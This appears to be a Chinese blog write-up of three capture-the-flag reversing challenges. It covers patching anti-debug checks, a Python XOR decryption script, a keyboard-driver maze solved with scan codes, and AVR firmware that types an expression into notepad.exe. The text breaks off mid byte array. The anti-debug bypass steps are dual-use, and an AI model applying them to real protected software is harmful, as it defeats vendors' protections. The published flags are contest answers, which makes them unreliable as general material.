<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Lucky-star"><a href="#Lucky-star" class="headerlink" title="Lucky star"></a>Lucky star</h2><p>找main函数，发现是smc过的，找找其他地方<br>0040155D和004015CA 调用了了一个反调试函数，把参数0x11改成0<br>00403148有一段进程名的字符串，全改成0<br>0040251b调用了另一个反调试函数，把下方的00402521的jz改成jmp<br>全部改完打个补丁，程序就能正常运行了。<br>在调用main函数的地方00401C20设下断点，开始调试，断下的时候main函数就解析好了<br>先播放了一段音频，中间还有sleep，大概一分钟，不相等可以直接把那一段的cmp jz改成cmp jmp</p>
<p>004015E0是加密函数<br>加密算法如下：<br>先把输入进行base64加密 a2位base64加密完的<br>它的base64大小写是反的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">v14=<span class="number">0</span></span><br><span class="line">v19 = <span class="built_in">strlen</span>(a2);</span><br><span class="line">  <span class="keyword">if</span> ( v19 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v16 = <span class="number">6</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v17 = rand() % <span class="number">4</span>;</span><br><span class="line">        v18 = v16;</span><br><span class="line">        v16 -= <span class="number">2</span>;</span><br><span class="line">        result = (_BYTE)v17 &lt;&lt; v18;</span><br><span class="line">        a2[v14] ^= result;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v16 &gt; <span class="number">-2</span> );</span><br><span class="line">      ++v14;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v14 &lt; v19 );</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，他对每一个字符异或了四个随机数（先对随机数进行了一些操作），在异或的地方设下条件记录断点，记录下异或的数据，然后反向解密就行了。</p>
<p>解密：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">secret=[<span class="number">0x49</span>,<span class="number">0xE6</span>,<span class="number">0x57</span>,<span class="number">0xBD</span>,<span class="number">0x3A</span>,<span class="number">0x47</span>,<span class="number">0x11</span>,<span class="number">0x4C</span>,<span class="number">0x95</span>,<span class="number">0xBC</span>,<span class="number">0xEE</span>,<span class="number">0x32</span>,<span class="number">0x72</span>,<span class="number">0xA0</span>,<span class="number">0xF0</span>,<span class="number">0xDE</span>,<span class="number">0xAC</span>,<span class="number">0xF2</span>,<span class="number">0x83</span>,<span class="number">0x56</span>,<span class="number">0x83</span>,<span class="number">0x49</span>,<span class="number">0x6E</span>,<span class="number">0xA9</span>,<span class="number">0xA6</span>,<span class="number">0xC5</span>,<span class="number">0x67</span>,<span class="number">0x3C</span>,<span class="number">0xCA</span>,<span class="number">0xC8</span>,<span class="number">0xCC</span>,<span class="number">0x05</span>]</span><br><span class="line">xor=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">48</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">64</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">64</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">192</span>,<span class="number">16</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">192</span>,<span class="number">48</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">128</span>,<span class="number">16</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">64</span>,<span class="number">32</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">48</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">192</span>,<span class="number">16</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">192</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">128</span>,<span class="number">48</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">192</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">128</span>,<span class="number">16</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">128</span>,<span class="number">48</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">192</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">32</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">192</span>,<span class="number">32</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">192</span>,<span class="number">16</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">128</span>,<span class="number">48</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">64</span>,<span class="number">16</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">64</span>,<span class="number">32</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">128</span>,<span class="number">48</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">192</span>,<span class="number">48</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">48</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">192</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">192</span>,<span class="number">32</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">64</span>,<span class="number">48</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">1</span>]</span><br><span class="line">a=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(secret)):</span><br><span class="line">    a+=chr(secret[i]^xor[<span class="number">4</span>*i]^xor[<span class="number">4</span>*i+<span class="number">1</span>]^xor[<span class="number">4</span>*i+<span class="number">2</span>]^xor[<span class="number">4</span>*i+<span class="number">3</span>])</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
<p>解密后：<br><code>Agn0zNSXENvTAv9lmg5HDdrFtw8ZFq==</code><br>它的base64加密大小写是反的，手动换一下= =<br><code>aGN0ZnsxenVtaV9LMG5hdDRfTW8zfQ==</code></p>
<blockquote>
<p><code>hctf{1zumi_K0nat4_Mo3</code></p>
</blockquote>
<h2 id="seven"><a href="#seven" class="headerlink" title="seven"></a>seven</h2><p>又是驱动逆向<br>sub_140001000中kbdclass应该跟键盘有关，但不知道怎么输入的<br>sub_1400012F0应该是解密函数了<br>中间有一段代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ( *v6 == <span class="number">0x11</span> )                        <span class="comment">// up</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5 &amp; <span class="number">0xFFFFFFF0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 -= <span class="number">0x10</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">        &#125;</span><br><span class="line">        v5 += <span class="number">0xD0</span>;</span><br><span class="line">        dword_1400030E4 = v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v8 != <span class="number">0x1F</span> )                         <span class="comment">// down</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">if</span> ( (v5 &amp; <span class="number">0xFFFFFFF0</span>) == <span class="number">0xD0</span> )</span><br><span class="line">        v5 -= <span class="number">0xD0</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v5 += <span class="number">0x10</span>;</span><br><span class="line">LABEL_13:</span><br><span class="line">      dword_1400030E4 = v5;</span><br><span class="line">LABEL_14:</span><br><span class="line">      <span class="keyword">if</span> ( v8 == <span class="number">0x1E</span> )                           <span class="comment">// left</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5 &amp; <span class="number">0xF</span> )</span><br><span class="line">          --v5;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          v5 += <span class="number">0xF</span>;</span><br><span class="line">        dword_1400030E4 = v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v8 == <span class="number">0x20</span> )                           <span class="comment">// right</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (v5 &amp; <span class="number">0xF</span>) == <span class="number">15</span> )</span><br><span class="line">          v5 -= <span class="number">15</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          ++v5;</span><br><span class="line">        dword_1400030E4 = v5;</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = aO[v5];</span><br><span class="line">      <span class="keyword">if</span> ( v9 == <span class="string">'*'</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = <span class="string">"-1s\n"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v9 != <span class="string">'7'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_29:</span><br><span class="line">          aO[v5] = <span class="string">'o'</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_30;</span><br><span class="line">        &#125;</span><br><span class="line">        v10 = <span class="string">"The input is the flag!\n"</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
<p>aO为字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">****************</span><br><span class="line">o..............*</span><br><span class="line">**************.*</span><br><span class="line">************...*</span><br><span class="line">***********..***</span><br><span class="line">**********..****</span><br><span class="line">*********..*****</span><br><span class="line">********..******</span><br><span class="line">*******..*******</span><br><span class="line">******..********</span><br><span class="line">*****..*********</span><br><span class="line">****..**********</span><br><span class="line">****7***********</span><br></pre></td></tr></table></figure>
<p><code>****************</code><br>要把这个o走到7的位置<br>0x11 0x1F 0x1E 0x20是硬件扫描码 wsad，对应写出移动的顺序就行了</p>
<p><a href="https://blog.csdn.net/wangyi_lin/article/details/9016125" target="_blank" rel="noopener">https://blog.csdn.net/wangyi_lin/article/details/9016125</a><br><a href="https://bbs.pediy.com/thread-218363.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-218363.htm</a></p>
<blockquote>
<p><code>flag:hctf{ddddddddddddddssaasasasasasasasasas}</code></p>
</blockquote>
<h2 id="PolishDuck"><a href="#PolishDuck" class="headerlink" title="PolishDuck"></a>PolishDuck</h2><p>找到了字符串 Arduino leonardo，是单片机的型号.<br>该题是AVR汇编, 应该是一道算法题, 转成bin之后能看到:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">44646 + ( 64094 + (71825 * ( ( 15873 + ( 21793 * ( 7234 + ( 17649 * ( ( 2155 + ( 74767 * ( 35392 + ( 88216 * ( 83920 + ( 16270 + ( 20151 * ( 5268 + ( 90693 * ( 82773 + ( 716 + 27377 * ( 44329 + ( 49366 * ( ( ( 38790 + ( 70247 * ( 97233 + ( 18347 + ( 22117 * ( ( ( 72576 + ( ( 47541 + ( 46975 + ( 53769 * ( 94005 + ( ( 72914 + ( 5137 + ( 87544 * 71583 + ( 20370 + ( 37968 * ( 17478 + ( ( 40532 + ( 10089 + ( 13332 * ( ( 24170 + ( 46845 * ( 16048 + 23142 * ( 31895 + ( 62386 * ( 12179 ( 94552 + ( ( ( 52918 + ( 91580 + ( ( ( 38412 + ( 91537 * ( 70 + ( 98594 * ( ( 35275 + ( 62912 * ( 4755 + ( 16737 * ( 27595 + ( ( 43551 + ( 64482 * 3550 ) ) - 21031 ) ) ) ) ) ) - 57553 ) ) - 89883 ) - 38900 ) ) ) - 19517 ) - 79082 ) ) ) ) ) ) ) ) - 70643 ) ) 55350 ) ) ) ) ) - 40301 ) ) ) ) - 83065 ) ) ) ) ) - 52460 ) ) - 49428 ) - 94686 ) ) ) ) ) ) - 1653 ) - 65217 ) ) ) - 43827 ) 66562 ) )</span><br></pre></td></tr></table></figure>
<p>但好像不是一个完整的等式, 无法解出…emmmm</p>
<p>做法是瞎猜的，没想到能做出来= =<br>这是个hex文件，首先不知道它机器的芯片，先用ida直接打开，能看到解析后的内容，也可以用相关工具解析成bin再用ida打开。发现0180地址出有一串字符串Arduino LLC Arduino Leonardo<br>这是它机器的型号，查找资料知道是avr架构的ATmega32u<br>ida打开的时候，processer type 选Atmel AVR，打开后选ATmega32_L，可以反汇编了。<br>在0D40地址看到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notepad.exe 44646 + ( 64094 + (71825 * ( ( 15873 + ( 21793 * ( 7234 + ( 17649 * ( ( 2155 + ( 74767 * ( 35392 + ( 88216 * ( 83920 + ( 16270 + ( 20151 * ( 5268 + ( 90693 * ( 82773 + ( 716 + 27377 * ( 44329 + ( 49366 * ( ( ( 38790 + ( 70247 * ( 97233 + ( 18347 + ( 22117 * ( ( ( 72576 + ( ( 47541 + ( 46975 + ( 53769 * ( 94005 + ( ( 72914 + ( 5137 + ( 87544 * 71583 + ( 20370 + ( 37968 * ( 17478 + ( ( 40532 + ( 10089 + ( 13332 * ( ( 24170 + ( 46845 * ( 16048 + 23142 * ( 31895 + ( 62386 * ( 12179 ( 94552 + ( ( ( 52918 + ( 91580 + ( ( ( 38412 + ( 91537 * ( 70 + ( 98594 * ( ( 35275 + ( 62912 * ( 4755 + ( 16737 * ( 27595 + ( ( 43551 + ( 64482 * 3550 ) ) - 21031 ) ) ) ) ) ) - 57553 ) ) - 89883 ) - 38900 ) ) ) - 19517 ) - 79082 ) ) ) ) ) ) ) ) - 70643 ) ) 55350 ) ) ) ) ) - 40301 ) ) ) ) - 83065 ) ) ) ) ) - 52460 ) ) - 49428 ) - 94686 ) ) ) ) ) ) - 1653 ) - 65217 ) ) ) - 43827 ) 66562 ) )</span><br></pre></td></tr></table></figure>
<p>不是一个完整的式子，不能计算，想起他方向。<br>这不是一个 完整的字符串，而是很多个字符串（中间有\x00），大致猜一下可能是选取其中某些字符串拼接起来，就能计算了<br>从开头开始跟踪，跟踪到sub_9A8，应该是解析相关的函数了。<br>往下找，找到可疑的地方0A6C开始：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">ROM:0A6C                 ldi     r22, 0xF4</span><br><span class="line">ROM:0A6D                 ldi     r23, 1</span><br><span class="line">ROM:0A6E                 ldi     r24, 0</span><br><span class="line">ROM:0A6F                 ldi     r25, 0</span><br><span class="line">ROM:0A70                 call    sub_8B6</span><br><span class="line">ROM:0A72                 ldi     r24, 0x40 ; &apos;@&apos;</span><br><span class="line">ROM:0A73                 ldi     r25, 1</span><br><span class="line">ROM:0A74                 call    sub_88D</span><br><span class="line">ROM:0A76                 ldi     r22, 0xF4</span><br><span class="line">ROM:0A77                 ldi     r23, 1</span><br><span class="line">ROM:0A78                 ldi     r24, 0</span><br><span class="line">ROM:0A79                 ldi     r25, 0</span><br><span class="line">ROM:0A7A                 call    sub_8B6</span><br><span class="line">ROM:0A7C                 ldi     r24, 0x4C ; &apos;L&apos;</span><br><span class="line">ROM:0A7D                 ldi     r25, 1</span><br><span class="line">ROM:0A7E                 call    sub_88D</span><br><span class="line">ROM:0A80                 ldi     r22, 0xF4</span><br><span class="line">ROM:0A81                 ldi     r23, 1</span><br><span class="line">ROM:0A82                 ldi     r24, 0</span><br><span class="line">ROM:0A83                 ldi     r25, 0</span><br><span class="line">ROM:0A84                 call    sub_8B6</span><br><span class="line">ROM:0A86                 ldi     r24, 0x53 ; &apos;S&apos;</span><br><span class="line">ROM:0A87                 ldi     r25, 1</span><br><span class="line">ROM:0A88                 call    sub_88D</span><br><span class="line">ROM:0A8A                 ldi     r22, 0xF4</span><br><span class="line">ROM:0A8B                 ldi     r23, 1</span><br><span class="line">ROM:0A8C                 ldi     r24, 0</span><br><span class="line">ROM:0A8D                 ldi     r25, 0</span><br><span class="line">ROM:0A8E                 call    sub_8B6</span><br><span class="line">ROM:0A90                 ldi     r24, 0x62 ; &apos;b&apos;</span><br><span class="line">ROM:0A91                 ldi     r25, 1</span><br><span class="line">ROM:0A92                 call    sub_88D</span><br></pre></td></tr></table></figure>
<p>有很多结构十分相似的部分，把不一样的地方都提取出来，是一堆地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">140  14C  153  162  177  18B  1A9  1C8  1D3  1EB  1FE  25E  207 21C 227 246 261 270 28B 298 2A3 2B1 25C 2BA 2C5 2D0 2D7 2F2 307 310 25E 327 346 3DC 34D 364 373 38F 3A6 3B3 3BF 3D0 3DF 3EF 400 44B 413 42C 43B 44F 452 490 45F 46C 47D 48E 497 49E 4B5 4CB 445 445 4D6 44D 44D 494 4E5 44F</span><br></pre></td></tr></table></figure>
<p>这些地址并不指向任何东西，但如过把140对应之前字符串的开头notepad.exe，14C刚好能对应第二个字符串开头44646，以此类推，而某些地址可能指向的不是某一字符串的开头，这样猜测整合完应该能得到完整算术式<br>试着把他们一一对应过去</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">unsigned char secret[] = &#123; 0x6E, 0x6F, 0x74, 0x65, 0x70, 0x61, 0x64, 0x2E, 0x65, 0x78,0x65, 0x00, 0x34, 0x34, 0x36, 0x34, 0x36, 0x20, 0x00, 0x2B,0x20, 0x28, 0x20, 0x36, 0x34, 0x30, 0x39, 0x34, 0x20, 0x2B,0x20, 0x28, 0x20, 0x00, 0x37, 0x31, 0x38, 0x32, 0x35, 0x20,0x2A, 0x20, 0x28, 0x20, 0x28, 0x20, 0x31, 0x35, 0x38, 0x37,0x33, 0x20, 0x2B, 0x20, 0x00, 0x28, 0x20, 0x32, 0x31, 0x37,0x39, 0x33, 0x20, 0x2A, 0x20, 0x28, 0x20, 0x37, 0x32, 0x33,0x34, 0x20, 0x2B, 0x20, 0x00, 0x28, 0x20, 0x31, 0x37, 0x36,0x34, 0x39, 0x20, 0x2A, 0x20, 0x28, 0x20, 0x28, 0x20, 0x32,0x31, 0x35, 0x35, 0x20, 0x2B, 0x20, 0x28, 0x20, 0x37, 0x34,0x37, 0x36, 0x37, 0x20, 0x00, 0x2A, 0x20, 0x28, 0x20, 0x33,0x35, 0x33, 0x39, 0x32, 0x20, 0x2B, 0x20, 0x28, 0x20, 0x38,0x38, 0x32, 0x31, 0x36, 0x20, 0x2A, 0x20, 0x28, 0x20, 0x38,0x33, 0x39, 0x32, 0x30, 0x20, 0x00, 0x2B, 0x20, 0x28, 0x20,0x31, 0x36, 0x32, 0x37, 0x30, 0x20, 0x00, 0x2B, 0x20, 0x28,0x20, 0x32, 0x30, 0x31, 0x35, 0x31, 0x20, 0x2A, 0x20, 0x28,0x20, 0x35, 0x32, 0x36, 0x38, 0x20, 0x2B, 0x20, 0x28, 0x20,0x00, 0x39, 0x30, 0x36, 0x39, 0x33, 0x20, 0x2A, 0x20, 0x28,0x20, 0x38, 0x32, 0x37, 0x37, 0x33, 0x20, 0x2B, 0x20, 0x00,0x28, 0x20, 0x37, 0x31, 0x36, 0x20, 0x2B, 0x20, 0x00, 0x32,0x37, 0x33, 0x37, 0x37, 0x20, 0x2A, 0x20, 0x28, 0x20, 0x34,0x34, 0x33, 0x32, 0x39, 0x20, 0x2B, 0x20, 0x28, 0x20, 0x00,0x34, 0x39, 0x33, 0x36, 0x36, 0x20, 0x2A, 0x20, 0x28, 0x20,0x00, 0x28, 0x20, 0x28, 0x20, 0x33, 0x38, 0x37, 0x39, 0x30,0x20, 0x2B, 0x20, 0x28, 0x20, 0x37, 0x30, 0x32, 0x34, 0x37,0x20, 0x2A, 0x20, 0x28, 0x20, 0x39, 0x37, 0x32, 0x33, 0x33,0x20, 0x00, 0x2B, 0x20, 0x28, 0x20, 0x31, 0x38, 0x33, 0x34,0x37, 0x20, 0x2B, 0x20, 0x28, 0x20, 0x32, 0x32, 0x31, 0x31,0x37, 0x20, 0x2A, 0x20, 0x28, 0x20, 0x28, 0x20, 0x00, 0x28,0x20, 0x37, 0x32, 0x35, 0x37, 0x36, 0x20, 0x2B, 0x20, 0x28,0x20, 0x28, 0x20, 0x00, 0x34, 0x37, 0x35, 0x34, 0x31, 0x20,0x2B, 0x20, 0x28, 0x20, 0x34, 0x36, 0x39, 0x37, 0x35, 0x20,0x2B, 0x20, 0x28, 0x20, 0x35, 0x33, 0x37, 0x36, 0x39, 0x20,0x00, 0x2A, 0x20, 0x28, 0x20, 0x39, 0x34, 0x30, 0x30, 0x35,0x20, 0x2B, 0x20, 0x00, 0x28, 0x20, 0x28, 0x20, 0x37, 0x32,0x39, 0x31, 0x34, 0x20, 0x00, 0x2B, 0x20, 0x28, 0x20, 0x35,0x31, 0x33, 0x37, 0x20, 0x2B, 0x20, 0x28, 0x20, 0x00, 0x38,0x37, 0x35, 0x34, 0x34, 0x20, 0x2A, 0x20, 0x00, 0x37, 0x31,0x35, 0x38, 0x33, 0x20, 0x2B, 0x20, 0x28, 0x20, 0x00, 0x32,0x30, 0x33, 0x37, 0x30, 0x20, 0x2B, 0x20, 0x28, 0x20, 0x00,0x33, 0x37, 0x39, 0x36, 0x38, 0x20, 0x00, 0x2A, 0x20, 0x28,0x20, 0x31, 0x37, 0x34, 0x37, 0x38, 0x20, 0x2B, 0x20, 0x28,0x20, 0x28, 0x20, 0x34, 0x30, 0x35, 0x33, 0x32, 0x20, 0x2B,0x20, 0x28, 0x20, 0x00, 0x31, 0x30, 0x30, 0x38, 0x39, 0x20,0x2B, 0x20, 0x28, 0x20, 0x31, 0x33, 0x33, 0x33, 0x32, 0x20,0x2A, 0x20, 0x28, 0x20, 0x00, 0x28, 0x20, 0x32, 0x34, 0x31,0x37, 0x30, 0x20, 0x00, 0x2B, 0x20, 0x28, 0x20, 0x34, 0x36,0x38, 0x34, 0x35, 0x20, 0x2A, 0x20, 0x28, 0x20, 0x31, 0x36,0x30, 0x34, 0x38, 0x20, 0x2B, 0x20, 0x00, 0x32, 0x33, 0x31,0x34, 0x32, 0x20, 0x2A, 0x20, 0x28, 0x20, 0x33, 0x31, 0x38,0x39, 0x35, 0x20, 0x2B, 0x20, 0x28, 0x20, 0x36, 0x32, 0x33,0x38, 0x36, 0x20, 0x2A, 0x20, 0x28, 0x20, 0x00, 0x31, 0x32,0x31, 0x37, 0x39, 0x20, 0x00, 0x28, 0x20, 0x39, 0x34, 0x35,0x35, 0x32, 0x20, 0x2B, 0x20, 0x28, 0x20, 0x28, 0x20, 0x28,0x20, 0x35, 0x32, 0x39, 0x31, 0x38, 0x20, 0x00, 0x2B, 0x20,0x28, 0x20, 0x39, 0x31, 0x35, 0x38, 0x30, 0x20, 0x2B, 0x20,0x28, 0x20, 0x00, 0x28, 0x20, 0x28, 0x20, 0x33, 0x38, 0x34,0x31, 0x32, 0x20, 0x2B, 0x20, 0x28, 0x20, 0x39, 0x31, 0x35,0x33, 0x37, 0x20, 0x2A, 0x20, 0x28, 0x20, 0x37, 0x30, 0x20,0x00, 0x2B, 0x20, 0x28, 0x20, 0x39, 0x38, 0x35, 0x39, 0x34,0x20, 0x2A, 0x20, 0x28, 0x20, 0x28, 0x20, 0x33, 0x35, 0x32,0x37, 0x35, 0x20, 0x00, 0x2B, 0x20, 0x28, 0x20, 0x36, 0x32,0x39, 0x31, 0x32, 0x20, 0x2A, 0x20, 0x00, 0x28, 0x20, 0x34,0x37, 0x35, 0x35, 0x20, 0x2B, 0x20, 0x28, 0x20, 0x00, 0x31,0x36, 0x37, 0x33, 0x37, 0x20, 0x2A, 0x20, 0x28, 0x20, 0x32,0x37, 0x35, 0x39, 0x35, 0x20, 0x00, 0x2B, 0x20, 0x28, 0x20,0x28, 0x20, 0x34, 0x33, 0x35, 0x35, 0x31, 0x20, 0x2B, 0x20,0x00, 0x28, 0x20, 0x36, 0x34, 0x34, 0x38, 0x32, 0x20, 0x2A,0x20, 0x33, 0x35, 0x35, 0x30, 0x20, 0x00, 0x29, 0x20, 0x29,0x20, 0x2D, 0x20, 0x32, 0x31, 0x30, 0x33, 0x31, 0x20, 0x29,0x20, 0x29, 0x20, 0x00, 0x29, 0x20, 0x29, 0x20, 0x29, 0x20,0x29, 0x20, 0x2D, 0x20, 0x35, 0x37, 0x35, 0x35, 0x33, 0x20,0x29, 0x20, 0x00, 0x29, 0x20, 0x2D, 0x20, 0x38, 0x39, 0x38,0x38, 0x33, 0x20, 0x29, 0x20, 0x2D, 0x20, 0x33, 0x38, 0x39,0x30, 0x30, 0x20, 0x29, 0x20, 0x29, 0x20, 0x00, 0x29, 0x20,0x2D, 0x20, 0x31, 0x39, 0x35, 0x31, 0x37, 0x20, 0x29, 0x20,0x2D, 0x20, 0x00, 0x37, 0x39, 0x30, 0x38, 0x32, 0x20, 0x29,0x20, 0x29, 0x20, 0x29, 0x20, 0x29, 0x20, 0x29, 0x20, 0x29,0x20, 0x29, 0x20, 0x29, 0x20, 0x00, 0x2D, 0x20, 0x37, 0x30,0x36, 0x34, 0x33, 0x20, 0x29, 0x20, 0x29, 0x20, 0x00, 0x35,0x35, 0x33, 0x35, 0x30, 0x20, 0x29, 0x20, 0x29, 0x20, 0x29,0x20, 0x00, 0x29, 0x20, 0x29, 0x20, 0x2D, 0x20, 0x34, 0x30,0x33, 0x30, 0x31, 0x20, 0x29, 0x20, 0x29, 0x20, 0x00, 0x29,0x20, 0x29, 0x20, 0x2D, 0x20, 0x38, 0x33, 0x30, 0x36, 0x35,0x20, 0x29, 0x20, 0x29, 0x20, 0x00, 0x29, 0x20, 0x29, 0x20,0x29, 0x20, 0x2D, 0x20, 0x00, 0x35, 0x32, 0x34, 0x36, 0x30,0x20, 0x00, 0x29, 0x20, 0x29, 0x20, 0x2D, 0x20, 0x34, 0x39,0x34, 0x32, 0x38, 0x20, 0x29, 0x20, 0x2D, 0x20, 